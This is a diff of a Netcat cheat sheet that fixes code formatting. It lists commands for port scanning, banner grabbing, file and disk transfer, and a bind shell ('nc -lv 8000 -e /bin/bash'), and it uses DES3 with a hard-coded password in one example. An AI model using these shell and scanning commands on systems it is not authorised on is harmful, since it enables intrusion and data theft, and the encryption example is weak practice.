@@ -22,7 +22,7 @@ intro: This cheat sheet provides various for using Netcat on both Linux and Unix
 
 Connect to a host located anywhere
 
-\`\`\`shell script $ nc \[options\] \[host\] \[port\]
+`$ nc \[options\] \[host\] \[port\]`
 
 ```text
 Listen for incoming connections
@@ -48,7 +48,7 @@ $ nc -lp port [host] [port]
 
 ### Chat client-server
 
-Server \(192.168.1.9\) \`\`\`shell script $ nc -lv 8000
+Server \(192.168.1.9\) `$ nc -lv 8000`
 
 ```text
 Client
@@ -60,7 +60,7 @@ $ nc 192.168.1.9 8000
 
 ### Banner grabbing
 
-\`\`\`shell script $ nc website.com 80 GET index.html HTTP/1.1 HEAD / HTTP/1.1
+`$ nc website.com 80 GET index.html HTTP/1.1 HEAD / HTTP/1.1`
 
 ```text
 or
@@ -70,7 +70,7 @@ echo "" | nc -zv -wl 192.168.1.1 801-805
 
 ### Port scanning
 
-Scan ports between 21 to 25 \`\`\`shell script $ nc -zvn 192.168.1.1 21-25
+Scan ports between 21 to 25 `$ nc -zvn 192.168.1.1 21-25`
 
 ```text
 Scan ports 22, 3306 and 8080
@@ -80,7 +80,7 @@ $ nc -zvn 192.168.1.1 22 3306 8080
 
 ### Proxy and port forwarding
 
-\`\`\`shell script $ nc -lp 8001 -c "nc 127.0.0.1 8000"
+`$ nc -lp 8001 -c "nc 127.0.0.1 8000"`
 
 ```text
 or
@@ -92,7 +92,7 @@ Create a tunnel from one local port to another
 
 ### Download file
 
-Server \(192.168.1.9\) \`\`\`shell script $ nc -lv 8000 &lt; file.txt
+Server \(192.168.1.9\) `$ nc -lv 8000 &lt; file.txt`
 
 ```text
 Client
@@ -104,7 +104,7 @@ Suppose you want to transfer a file “file.txt” from server A to client B.
 
 ### Upload file
 
-Server \(192.168.1.9\) \`\`\`shell script $ nc -lv 8000 &gt; file.txt
+Server \(192.168.1.9\) `$ nc -lv 8000 &gt; file.txt`
 
 ```text
 Client
@@ -116,7 +116,7 @@ Suppose you want to transfer a file “file.txt” from client B to server A:
 
 ### Directory transfer
 
-Server \(192.168.1.9\) \`\`\`shell script $ tar -cvf – dir\_name \| nc -l 8000
+Server \(192.168.1.9\) `$ tar -cvf – dir\_name \| nc -l 8000`
 
 ```text
 Client
@@ -128,7 +128,7 @@ Suppose you want to transfer a directory over the network from A to B.
 
 ### Encrypt transfer
 
-Server \(192.168.1.9\) \`\`\`shell script $ nc -l 8000 \| openssl enc -d -des3 -pass pass:password &gt; file.txt
+Server \(192.168.1.9\) `$ nc -l 8000 \| openssl enc -d -des3 -pass pass:password &gt; file.txt`
 
 ```text
 Client
@@ -140,7 +140,7 @@ Encrypt data before transfering over the network
 
 ### Clones
 
-Server \(192.168.1.9\) \`\`\`shell script $ dd if=/dev/sda \| nc -l 8000
+Server \(192.168.1.9\) `$ dd if=/dev/sda \| nc -l 8000`
 
 ```text
 Client
@@ -152,7 +152,7 @@ Cloning a linux PC is very simple. Suppose your system disk is /dev/sda
 
 ### Video streaming
 
-Server \(192.168.1.9\) \`\`\`shell script $ cat video.avi \| nc -l 8000
+Server \(192.168.1.9\) `$ cat video.avi \| nc -l 8000`
 
 ```text
 Client
@@ -164,7 +164,7 @@ Streaming video with netcat
 
 ### Remote shell
 
-Server \(192.168.1.9\) \`\`\`shell script $ nc -lv 8000 -e /bin/bash
+Server \(192.168.1.9\) `$ nc -lv 8000 -e /bin/bash`
 
 ```text
 Client
@@ -176,7 +176,7 @@ We have used remote Shell using the telnet and ssh but what if they are not inst
 
 ### Reverse shell
 
-Server \(192.168.1.9\) \`\`\`shell script $ nc -lv 8000
+Server \(192.168.1.9\) `$ nc -lv 8000`
 
 ```text
 Client
